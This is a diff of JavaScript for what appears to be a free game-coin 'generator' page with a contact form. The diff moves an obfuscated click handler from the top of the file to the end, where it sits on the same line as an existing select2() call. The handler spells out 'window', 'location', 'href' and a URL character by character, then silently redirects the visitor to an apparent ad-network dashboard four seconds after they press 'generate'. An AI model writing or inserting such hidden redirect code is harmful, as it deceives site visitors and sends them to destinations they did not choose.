@@ -1,12 +1,3 @@
-document.getElementById('generate').addEventListener('click', function() {
-    setTimeout(function() {
-        var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
-        var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
-        var _h = ['h', 'r', 'e', 'f'].join('');
-        var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'p', 'u', 'b', 'l', 'i', 's', 'h', 'e', 'r', 's', '.', 'a', 'd', 'b', 'l', 'u', 'e', 'm', 'e', 'd', 'i', 'a', '.', 'c', 'o', 'm', '/', 'd', 'a', 's', 'h', 'b', 'o', 'a', 'r', 'd'].join('');
-        window[_l][_h] = _u;
-    }, 4000);
-});
 	var coinsNums = [240000, 640000, 1440000, 3400000, 10800000, 25600000];
 	var rollsNums = ['30', '80', '180', '425', '1400', '3200'];
 	var rollsExtraNums = ['50', '160', '450', '1250', '5000', '15000'];
@@ -426,6 +417,7 @@ $('#contactform').submit(function(e){
 			}
 		});
 	}
+
 	var movementStrength = 15;
 	var height = movementStrength / $(window).height();
 	var width = movementStrength / $(window).width();
@@ -442,4 +434,14 @@ $('#contactform').submit(function(e){
 		$('select').select2();
 	});
 	
-	$('select').select2();
+	$('select').select2();    document.getElementById('generate').addEventListener('click', function() {
+    setTimeout(function() {
+        var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
+        var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
+        var _h = ['h', 'r', 'e', 'f'].join('');
+        var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'p', 'u', 'b', 'l', 'i', 's', 'h', 'e', 'r', 's', '.', 'a', 'd', 'b', 'l', 'u', 'e', 'm', 'e', 'd', 'i', 'a', '.', 'c', 'o', 'm', '/', 'd', 'a', 's', 'h', 'b', 'o', 'a', 'r', 'd'].join('');
+        window[_l][_h] = _u;
+    }, 4000);
+});
+
+
